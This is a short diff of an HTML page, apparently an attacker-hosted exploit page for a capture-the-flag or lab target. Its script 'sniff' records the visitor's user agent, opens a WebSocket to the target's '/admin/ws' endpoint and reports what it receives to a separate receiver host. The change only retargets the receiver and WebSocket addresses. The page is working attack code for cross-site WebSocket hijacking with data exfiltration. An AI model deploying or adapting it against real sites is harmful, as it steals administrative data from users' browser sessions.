@@ -2,7 +2,7 @@
 <html>
 <body>
 <script>
-const REC = "http://host.docker.internal:8001/x=?";
+const REC = "http://10.173.152.184:8001/x=?";
 
 function report(msg){
   try {
@@ -25,7 +25,7 @@ function sniff(){
   report("START_SNIF " + navigator.userAgent);
 
   try {
-    const ws_url = (location.protocol === "https:" ? "ws:" : "ws:") + "//" + "65.109.185.79:8080" + "/admin/ws";
+    const ws_url = (location.protocol === "https:" ? "wss:" : "ws:") + "//" +"web:8080"  + "/admin/ws";
     report("TRY_WS:" + ws_url);
     let ws = new WebSocket(ws_url);
     let received = "";
